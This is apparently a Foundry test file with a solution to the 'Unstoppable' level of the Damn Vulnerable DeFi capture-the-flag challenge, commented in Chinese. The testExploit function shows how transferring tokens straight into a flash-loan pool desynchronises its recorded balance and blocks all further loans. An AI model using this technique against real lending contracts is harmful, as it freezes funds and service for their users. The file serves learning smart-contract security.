// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";

import {MaliciousReceiver} from "./MaliciousReceiver.sol";

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;

    Utilities internal utils;
    UnstoppableLender internal unstoppableLender;
    ReceiverUnstoppable internal receiverUnstoppable;
    DamnValuableToken internal dvt;
    address payable internal attacker;
    address payable internal someUser;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        attacker = users[0];
        someUser = users[1];
        vm.label(someUser, "User");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken(); // msg.sender 會 mint type(uint256).max 個 DVT
        vm.label(address(dvt), "DVT");

        unstoppableLender = new UnstoppableLender(address(dvt));
        vm.label(address(unstoppableLender), "Unstoppable Lender");

        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
        unstoppableLender.depositTokens(TOKENS_IN_POOL); // depositTokens 會用 transferFrom 來轉 token, unstoppableLender 會有 1_000_000 * 10 ** 18 DVT

        dvt.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE); // attacker 起始會有 100 * 10 ** 18 DVT

        assertEq(dvt.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);
        assertEq(dvt.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(
            address(unstoppableLender)
        );
        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // 想辦法讓 poolBalance(記錄的 balance) 跟 balanceBefore(現在的 balance) 的值不一樣
        // balanceBefore = damnValuableToken.balanceOf(address(this)); 現在合約內的 balance
        // poolBalance 則是起始值為 0, 但每次 depositTokens() 時，都會 poolBalance = poolBalance + amount;
        vm.startPrank(attacker);
        MaliciousReceiver maliciousReceiver = new MaliciousReceiver(address(unstoppableLender));
        // 把手上的 100 顆 dvt，在 flash loan 的時候，也轉進去池子內，就會造成 AssertionViolated 的錯誤
        IERC20(address(dvt)).transfer(address(maliciousReceiver), 100 * 10 ** 18);
        maliciousReceiver.executeFlashLoan(1_000_000 * 10 ** 18);
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        // 下一行要出現 if (poolBalance != balanceBefore) revert AssertionViolated(); 的錯誤
        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // It is no longer possible to execute flash loans
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }
}
